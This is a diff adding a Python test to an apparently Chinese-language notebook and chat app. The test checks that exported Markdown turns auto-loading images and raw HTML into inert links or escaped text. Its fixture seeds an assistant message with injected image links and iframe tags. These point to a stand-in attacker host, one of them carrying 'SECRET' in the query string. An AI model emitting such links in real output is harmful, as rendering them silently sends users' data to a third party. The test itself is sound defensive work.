@@ -761,3 +761,54 @@ def test_stream_reports_no_dropped_chunks_when_everything_fits(monkeypatch, tmp_
     _post_stream(main, db)
 
     assert "dropped_chunks" not in _last_assistant(db)[2]
+
+
+def test_markdown_exports_do_not_fetch_when_opened_elsewhere(monkeypatch, tmp_path):
+    """L3: an exported .md is opened in editors and wikis that render images
+    and raw HTML themselves. Every export route must carry the same rule as
+    the in-app renderer -- nothing loads without a click -- and leave code as
+    written. Asserted on all three routes, since each builds its own text."""
+    main, db = _fresh_app(monkeypatch, tmp_path)
+    injected = "\n".join([
+        "結論 ![機密](https://attacker.example/c?d=SECRET) 與 ![](https://attacker.example/b.png)",
+        '<img src="https://attacker.example/raw.png"> <IFRAME src="https://attacker.example/f"></IFRAME>',
+        "<b>粗體保留</b> 與行內 `![code](https://keep.example/i.png)`",
+        "```markdown",
+        "![fenced](https://keep.example/f.png)",
+        "<img src=\"https://keep.example/raw.png\">",
+        "```",
+    ])
+
+    with TestClient(main.app) as client:
+        _login(client)
+        user, notebook_id = _seed_notebook(db, title="匯出防護")
+        with db.connect() as conn:
+            convo_id = conn.execute(
+                "INSERT INTO conversations (user_id, notebook_id, title) VALUES (?, ?, '對話')",
+                (user["id"], notebook_id),
+            ).lastrowid
+            conn.execute(
+                "INSERT INTO messages (conversation_id, user_id, role, content) VALUES (?, ?, 'assistant', ?)",
+                (convo_id, user["id"], injected),
+            )
+            note_id = conn.execute(
+                "INSERT INTO notes (notebook_id, user_id, title, content) VALUES (?, ?, '筆記', ?)",
+                (notebook_id, user["id"], injected),
+            ).lastrowid
+
+        exports = {
+            "conversation": client.get(f"/notebooks/{notebook_id}/chat/{convo_id}/export").text,
+            "notes": client.get(f"/notebooks/{notebook_id}/notes/export").text,
+            "note": client.get(f"/notebooks/{notebook_id}/notes/{note_id}/export").text,
+        }
+
+    for name, text in exports.items():
+        assert "[圖片：機密](https://attacker.example/c?d=SECRET)" in text, name
+        assert "[圖片：未命名](https://attacker.example/b.png)" in text, name
+        assert "![機密]" not in text and "![](" not in text, name
+        assert '&lt;img src="https://attacker.example/raw.png">' in text, name
+        assert '&lt;IFRAME src="https://attacker.example/f">&lt;/IFRAME>' in text, name
+        assert "<b>粗體保留</b>" in text, name
+        # Code is shown, not rendered, so it stays exactly as written.
+        assert "`![code](https://keep.example/i.png)`" in text, name
+        assert "![fenced](https://keep.example/f.png)\n<img src=\"https://keep.example/raw.png\">" in text, name
